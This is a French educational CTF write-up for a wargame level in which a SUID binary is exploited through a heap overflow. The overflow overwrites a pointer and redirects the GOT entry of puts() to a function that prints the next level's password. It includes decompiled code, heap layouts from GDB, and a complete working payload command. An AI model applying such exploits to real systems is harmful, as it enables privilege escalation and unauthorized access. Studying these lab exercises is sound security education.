# Level7 - README Pédagogique

## 🎯 Objectif
Exploiter un **heap buffer overflow** avec **double indirection** pour écrire l'adresse de `m()` dans la GOT de `puts()` et afficher le flag.

**Technique** : Heap Overflow + GOT Overwrite via Double Indirection

---

## 🔍 Reconnaissance

### Permissions du fichier
```bash
$ ls -l level7
-rwsr-s---+ 1 level8 users  5648 Mar  6  2016 level7
    ^
    └─ Bit SUID actif → s'exécute avec les droits de level8
```

### Tests comportementaux
```bash
$ ./level7
# Segmentation fault (argv[1] = NULL)

$ ./level7 test
# Segmentation fault (argv[2] = NULL)

$ ./level7 test arg2
# ~~
```

Le programme nécessite **2 arguments**.

---

## 🛠️ Analyse technique

### Code source (décompilé depuis Ghidra)
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

char c[68];  // Variable globale pour le flag

void m(void)
{
    time_t timestamp = time(NULL);
    printf("%s - %d\n", c, timestamp);  // Affiche le flag !
}

int main(int argc, char **argv)
{
    int *struct_a;
    void *buffer_a;
    int *struct_b;
    void *buffer_b;
    FILE *file;

    // Allocation 1 : Struct A
    struct_a = malloc(8);
    struct_a[0] = 1;              // Valeur
    buffer_a = malloc(8);         // Allocation 2 : Buffer A
    struct_a[1] = buffer_a;       // Pointeur vers Buffer A

    // Allocation 3 : Struct B
    struct_b = malloc(8);
    struct_b[0] = 2;              // Valeur
    buffer_b = malloc(8);         // Allocation 4 : Buffer B
    struct_b[1] = buffer_b;       // Pointeur vers Buffer B

    strcpy((char *)struct_a[1], argv[1]);  // ⚠️ Buffer overflow !
    strcpy((char *)struct_b[1], argv[2]);  // ⚠️ Écrit où struct_b[1] pointe

    file = fopen("/home/user/level8/.pass", "r");
    fgets(c, 68, file);           // Lit le flag dans c
    puts("~~");                   // ← On va détourner ça vers m()

    return 0;
}
```

**Observations critiques** :
1. Deux `strcpy()` sans vérification → heap overflow possible
2. Le flag est lu dans la variable globale `c` avant `puts()`
3. `struct_b[1]` est un **pointeur** utilisé par le 2ème `strcpy()`
4. Si on écrase `struct_b[1]` → on contrôle où `argv[2]` est écrit !

---

## 💣 Vulnérabilité : Heap Overflow + Double Indirection

### Le mécanisme de double indirection

**Indirection simple (level6)** :
```
Overflow → Écrase directement le pointeur de fonction
```

**Double indirection (level7)** :
```
Overflow → Écrase un pointeur (struct_b[1])
         → Ce pointeur contrôle où le 2ème strcpy écrit
         → On peut écrire DANS LA GOT !
```

### Pourquoi c'est puissant ?

Avec cette technique, on peut écrire **n'importe quoi, n'importe où** :
- `argv[1]` choisit **OÙ** écrire (en écrasant `struct_b[1]`)
- `argv[2]` choisit **QUOI** écrire (le contenu)

C'est une primitive **write-what-where**.

---

## 🔑 Concepts clés

### 1. Layout du heap avec 4 malloc()

```
Adresse      Contenu
─────────────────────────────────────────────────────
0x0804a000   Header Struct A (8 bytes)
0x0804a008   struct_a[0] = 1
0x0804a00c   struct_a[1] = 0x0804a018  ← Pointeur vers Buffer A
─────────────────────────────────────────────────────
0x0804a010   Header Buffer A (8 bytes)
0x0804a018   Buffer A (8 bytes)        ← strcpy(argv[1]) écrit ici
─────────────────────────────────────────────────────
0x0804a020   Header Struct B (8 bytes)
0x0804a028   struct_b[0] = 2
0x0804a02c   struct_b[1] = 0x0804a038  ← Pointeur vers Buffer B
                                       ← CIBLE de l'overflow !
─────────────────────────────────────────────────────
0x0804a030   Header Buffer B (8 bytes)
0x0804a038   Buffer B (8 bytes)        ← strcpy(argv[2]) écrit ici
─────────────────────────────────────────────────────
```

### 2. Calcul de l'offset

**De Buffer A (0x0804a018) jusqu'à struct_b[1] (0x0804a02c)** :
```
Buffer A          : 8 bytes
Header Struct B   : 8 bytes
struct_b[0]       : 4 bytes
─────────────────────────
Total             : 20 bytes
```

### 3. La stratégie en 2 étapes

#### Étape 1 : Contrôler la destination (argv[1])

**Overflow Buffer A pour écraser `struct_b[1]`** :
```
argv[1] = "A" × 20 + adresse_GOT_puts

Résultat :
struct_b[1] = adresse GOT puts (0x08049928)
```

**Maintenant `struct_b[1]` ne pointe plus vers Buffer B, mais vers la GOT de `puts()` !**

#### Étape 2 : Écrire dans la GOT (argv[2])

```c
strcpy((char *)struct_b[1], argv[2]);
//             ^^^^^^^^^^^^^
//             = GOT[puts] (changé à l'étape 1)
//             → argv[2] est écrit dans GOT[puts] !
```

**Si argv[2] = adresse de m()** :
```
GOT[puts] = adresse de m()
→ puts("~~") appelle m() à la place
→ m() affiche c qui contient le flag ! ✅
```

### 4. Ordre d'exécution crucial

```c
strcpy(..., argv[1]);          // 1. Notre overflow
strcpy(..., argv[2]);          // 2. Notre GOT overwrite
fopen("/home/user/level8/.pass");
fgets(c, 68, file);            // 3. Le flag est lu dans c
puts("~~");                    // 4. puts() → m() → affiche c
```

**Le flag est déjà dans `c` quand `m()` s'exécute !** C'est pour ça que ça fonctionne.

### 5. Pourquoi cibler `struct_b[1]` et pas `struct_b[0]` ?

```c
struct_b[0] = 2;        // Simple valeur (jamais utilisée après)
struct_b[1] = buffer_b; // POINTEUR utilisé par strcpy !
```

**`struct_b[1]` détermine OÙ le 2ème `strcpy` écrit.** C'est la clé de l'exploitation.

---

## 🚀 Construction du payload

### Étape 1 : Vérifier l'offset (IMPORTANT)

**Toujours vérifier l'offset, ne jamais assumer !**

#### Méthode 1 : GDB + Examine heap (recommandée)

```bash
gdb level7

# Breakpoint sur strcpy pour s'arrêter avant le crash
(gdb) break strcpy
Breakpoint 1 at 0x80483e0

(gdb) run a b
# Arguments courts pour éviter le crash
# S'arrête au premier strcpy, heap déjà alloué

# Examiner la structure du heap
(gdb) x/60wx 0x0804a000
0x804a000:  0x00000000  0x00000011  0x00000001  0x0804a018
            ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^
            prev_size   size        struct_a[0] struct_a[1]
            (header)    (header)    = 1         →Buffer A
            
0x804a010:  0x00000000  0x00000011  0x00000000  0x00000000
            ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^
            prev_size   size        Buffer A (vide)
            (header)    (header)
            
0x804a020:  0x00000000  0x00000011  0x00000002  0x0804a038
            ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^
            prev_size   size        struct_b[0] struct_b[1] ← CIBLE !
            (header)    (header)    = 2         →Buffer B
            
0x804a030:  0x00000000  0x00000011  0x00000000  0x00000000
            ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^
            prev_size   size        Buffer B (vide)
            (header)    (header)

# Identifier les adresses clés
# Buffer A commence à   : 0x0804a018 (ligne 1, 4ème valeur)
# struct_b[1] est à     : 0x0804a02c (ligne 3, 4ème valeur)
# Offset = 0x02c - 0x018 = 0x14 = 20 bytes ✅
```

#### Méthode 2 : Calcul manuel (pédagogique)

```
De Buffer A (0x0804a018) jusqu'à struct_b[1] (0x0804a02c) :

Buffer A          : 8 bytes (0x018 → 0x020)
Header Struct B   : 8 bytes (0x020 → 0x028)
struct_b[0]       : 4 bytes (0x028 → 0x02c)
─────────────────────────────
Total             : 20 bytes
```

#### Méthode 3 : Test empirique

```bash
./level7 $(python -c 'print "A"*20 + "BBBB"') test
# Segfault → vérifier dans GDB quelle adresse a causé le crash
# Si c'est 0x42424242 ("BBBB") → offset = 20 ✅
```

**Offset confirmé : 20 bytes**

---

### Étape 1 bis : Visualiser l'overflow en action (optionnel mais pédagogique)

**Voir AVANT et APRÈS l'overflow** :

```bash
# AVANT l'overflow
gdb level7
(gdb) break strcpy
(gdb) run a b
(gdb) x/4wx 0x0804a020
0x804a020:  0x00000000  0x00000011  0x00000002  0x0804a038
                                                ^^^^^^^^^^
                                                struct_b[1] = Buffer B

(gdb) quit

# APRÈS l'overflow
gdb level7
(gdb) break strcpy
(gdb) run $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
(gdb) continue  # Passer au 2ème strcpy (après overflow)
(gdb) x/4wx 0x0804a020
0x804a020:  0x41414141  0x41414141  0x41414141  0x08049928
                                                ^^^^^^^^^^
                                                struct_b[1] = GOT puts ! ✅
```

**Observation** : `0x0804a038` (Buffer B) a été remplacé par `0x08049928` (GOT puts) !

**Bonus - Voir argv[2] écrire dans la GOT** :

```bash
# Avant que argv[2] s'écrive
(gdb) x/wx 0x08049928
0x8049928 <puts@got.plt>:	0xb7e819b0  ← Adresse originale de puts

(gdb) continue  # strcpy(GOT[puts], argv[2]) s'exécute

# Après que argv[2] s'est écrit
(gdb) x/wx 0x08049928
0x8049928 <puts@got.plt>:	0x080484f4  ← Adresse de m() ! ✅
```

---

### Étape 2 : Trouver les adresses critiques

#### Adresse de `m()`
```bash
# Dans Ghidra → cliquer sur m()
# Adresse : 0x080484f4

# Ou avec objdump :
objdump -t level7 | grep " m$"
# 080484f4 g     F .text  m
```

#### Adresse de `puts()` dans la GOT
```bash
objdump -R level7 | grep puts
# 08049928 R_386_JUMP_SLOT   puts
```

### Étape 2 : Calculer l'offset

```
De Buffer A jusqu'à struct_b[1] :
  8 bytes (Buffer A)
+ 8 bytes (Header Struct B)
+ 4 bytes (struct_b[0])
= 20 bytes
```

### Étape 3 : Construire les payloads

#### Payload argv[1] : Préparer la cible
```
"A" × 20 + adresse_GOT_puts

Conversion little-endian :
0x08049928 → \x28\x99\x04\x08

Payload :
python -c 'print "A"*20 + "\x28\x99\x04\x08"'
```

#### Payload argv[2] : Écrire dans la GOT
```
adresse_de_m()

Conversion little-endian :
0x080484f4 → \xf4\x84\x04\x08

Payload :
python -c 'print "\xf4\x84\x04\x08"'
```

### Commande finale
```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

---

## 🔄 Déroulement de l'exploitation

```
1. malloc() × 4 → Crée la structure sur le heap

2. strcpy(Buffer A, argv[1]) :
   argv[1] = "A"*20 + 0x08049928
   → Overflow Buffer A
   → Écrase struct_b[1] = 0x08049928 (GOT de puts)

3. strcpy(struct_b[1], argv[2]) :
   struct_b[1] = 0x08049928 (GOT puts)
   argv[2] = 0x080484f4 (m())
   → Écrit 0x080484f4 à l'adresse 0x08049928
   → GOT[puts] = adresse de m() ✅

4. fgets(c, 68, file) :
   → Lit le flag dans la variable globale c

5. puts("~~") :
   → CPU cherche l'adresse dans GOT[puts]
   → GOT[puts] = 0x080484f4 (m())
   → m() s'exécute !
   → m() affiche c (le flag) avec un timestamp ! 🎉
```

---

## 📝 Classification

**Type de vulnérabilité** :
- **CWE-122** : Heap-based Buffer Overflow
- **CWE-123** : Write-what-where Condition
- **CWE-250** : Execution with Unnecessary Privileges (SUID)

**Technique d'exploitation** :
- **Heap Overflow + GOT Overwrite via Double Indirection**

---

## 🎓 Résumé

1. **Vulnérabilité** : Deux `strcpy()` sans vérification sur le heap
2. **Technique** : Double indirection (overflow contrôle un pointeur qui contrôle où on écrit)
3. **Cible 1** : `struct_b[1]` (on le fait pointer vers GOT[puts])
4. **Cible 2** : GOT[puts] (on y écrit l'adresse de m())
5. **Payload** : argv[1] = offset + GOT, argv[2] = adresse m()
6. **Résultat** : puts() → m() → affiche le flag

---

## 🔐 Comparaison avec les niveaux précédents

| | Level6 | Level7 |
|---|---|---|
| **Indirection** | Simple (direct) | Double (indirect) |
| **Overflow** | Buffer → func_ptr | Buffer A → struct_b[1] → GOT |
| **Cible** | Function pointer | GOT entry |
| **Arguments** | 1 (argv[1]) | 2 (argv[1] + argv[2]) |
| **Complexité** | Moyenne | Élevée |
| **Primitive** | Control flow redirect | Write-what-where |